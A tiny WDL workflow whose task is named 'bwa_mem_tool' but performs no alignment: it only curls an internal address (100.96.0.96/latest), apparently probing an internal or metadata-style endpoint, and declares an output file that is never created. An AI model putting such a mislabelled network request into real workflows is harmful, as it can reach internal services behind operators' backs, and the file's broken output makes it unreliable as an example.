task bwa_mem_tool {
  command {
        mkdir -p /tmp/0518
        cd /tmp/0518
        curl http://100.96.0.96/latest
  }
  output {
    File sam1 = "/tmp/0518/log.txt"
  }
}
workflow wf {
  call bwa_mem_tool
}
